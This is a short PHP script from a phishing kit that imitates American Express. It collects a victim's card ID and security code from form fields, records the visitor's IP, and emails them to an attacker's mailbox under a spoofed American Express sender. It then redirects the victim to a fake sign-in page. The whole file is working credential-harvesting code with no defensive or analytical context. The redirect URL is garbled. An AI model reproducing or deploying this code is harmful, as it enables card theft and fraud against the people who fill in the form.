<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------AmeMoney-----------\n";
$message .= "CID: ".$_POST['amebo']."\n";
$message .= "CSC: ".$_POST['osho']."\n";
$message .= "------------------------\n";

$send = "youremail@gmail.com";
$subject = "Ameican Expo - $ip";
$headers = "From: American Exp<Ortis@wixema.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
}
header("Location: info.html?section=signinpage&update=&cookiecheck=yes&destination=nba/signin&actionStartup/Application$update=&cookiecheck=yes&destinpage&update=&cookiecheck=");

	 
?>